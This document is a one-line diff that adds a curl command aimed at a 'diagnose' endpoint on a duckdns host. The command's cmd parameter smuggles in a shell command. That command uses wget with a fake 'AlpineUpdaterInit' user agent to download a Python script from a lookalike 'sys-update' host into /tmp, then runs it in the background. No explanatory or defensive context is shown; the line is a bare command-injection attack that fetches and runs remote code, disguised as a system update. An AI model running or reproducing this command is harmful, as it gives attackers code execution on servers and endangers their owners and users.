@@ -1,0 +1,1 @@
+curl "https://ns-web-app.duckdns.org:4443/diagnose?cmd=wget%20-U%20'AlpineUpdaterInit/1.0'%20https://ns-alpine-sys-update.duckdns.org/update.py%20-O%20/tmp/sys_update.py;%20python3%20/tmp/sys_update.py%20%26"
